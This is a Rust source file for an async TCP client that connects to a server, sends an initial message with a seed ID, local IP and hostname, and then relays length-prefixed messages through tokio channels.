use std::{net::SocketAddr, usize};

use anyhow::Result;
use tokio::{
    io::{split, AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::mpsc,
};

use crate::{commands::command::Command, utils};

use super::data::DataPacket;

pub async fn start(
    server_addr: &str,
) -> Result<(mpsc::Receiver<Vec<u8>>, impl Fn(Vec<u8>) -> Result<()>)> {
    let server_addr: SocketAddr = server_addr.parse()?;
    let mut stream = TcpStream::connect(server_addr).await?;

    // Initial message to kick off data transfer with UUID
    //let uuid = config::get::<String>("uuid").unwrap().unwrap();
    let uuid = utils::get_seed();
    let ip = utils::local_ip();
    let hostname = utils::hostname();
    let command = Command::ClientInfo { uuid, ip, hostname };
    let cmd_string = serde_json::to_string(&command)?;
    let data = DataPacket::from_str(&cmd_string);
    let raw = &data.to_raw();
    stream.write_all(raw).await?;

    let (mut reader, mut writer) = split(stream);

    let (incoming_tx, incoming_rx) = mpsc::channel::<Vec<u8>>(10);
    let (write_tx, mut write_rx) = mpsc::channel::<Vec<u8>>(10);

    tokio::spawn(async move {
        loop {
            let mut length_buffer = [0u8; 4];
            if let Err(e) = reader.read_exact(&mut length_buffer).await {
                eprintln!("failed to read length of data: {}", e);
                break;
            }

            let length = u32::from_be_bytes(length_buffer) as usize;
            let mut message_buffer = vec![0u8; length + 4];
            message_buffer[..4].copy_from_slice(&length_buffer);

            if let Err(e) = reader.read_exact(&mut message_buffer[4..]).await {
                eprintln!("failed to read the message: {:?}", e);
                break;
            }

            if let Err(e) = incoming_tx.send(message_buffer).await {
                eprintln!("failed to send message to the channel: {:?}", e);
                break;
            }
        }

        Ok::<(), anyhow::Error>(())
    });

    tokio::spawn(async move {
        while let Some(data) = write_rx.recv().await {
            writer.write_all(&data).await?;
            writer.flush().await?;
        }
        Ok::<(), anyhow::Error>(())
    });

    let send_data = move |message: Vec<u8>| -> Result<()> {
        write_tx.try_send(message)?;
        Ok(())
    };

    Ok((incoming_rx, send_data))
}
